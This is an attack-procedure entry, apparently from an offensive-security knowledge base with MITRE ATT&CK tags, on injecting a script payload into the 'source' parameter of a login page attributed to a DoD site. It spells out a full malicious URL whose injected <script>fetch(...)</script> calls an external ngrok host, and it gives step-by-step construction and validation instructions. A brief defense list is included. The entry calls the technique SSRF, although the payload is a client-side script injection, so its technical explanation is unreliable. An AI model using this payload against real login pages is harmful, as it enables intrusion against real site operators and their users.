---
id: proc-inject-source-payload
tags:
  - ssrf
  - url-injection
  - parameter
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:01.833Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-SSRF-Payload-Into-Login-Page-Source-Parameter

## Summary

This procedure appends the crafted JavaScript fetch payload to the 'source' parameter of the target login page URL, exploiting lack of input validation to trigger SSRF when the page is accessed.

## Description

Targeted at web login pages like the DoD site, this injection leverages reflected or stored parameter handling to execute the payload server-side. The 'source' parameter is commonly used for redirects or embeds, making it a prime vector. Outcomes include the server fetching external resources, exfiltrating data.

## Requirements

1. Base target URL (e.g., https://www.█████████)
2. Crafted payload from previous procedure
3. URL construction tool (manual or browser)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize query parameters for script tags
- Use parameterized queries or escaping for URL handling
- Log and alert on suspicious parameter values containing script

## Objectives

1. Form a functional malicious URL
2. Ensure payload integration without breaking the base URL
3. Prepare for victim simulation

## Instructions

### Step 1: Append to Base URL

**Context**: Modify the login page URL by adding the source parameter with payload.

**Instructions**: Start with base: https://www.█████████ then add &source='><script>fetch('https://abc123.ngrok.io')</script>' along with other params like &server=submit.moboard.com&display=Please+log+on&title=%3C.

> Full URL example: https://www.█████████&source='><script>fetch('https://abc123.ngrok.io')</script>&server=submit.moboard.com&display=Please+log+on&title=%3C. Verify URL parses correctly.

### Step 2: Validate URL

**Context**: Check for errors in construction.

**Instructions**: Paste into browser address bar (without accessing) to ensure no syntax issues.

> Success: URL loads the page without 400 errors on injection attempt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- injection
- url
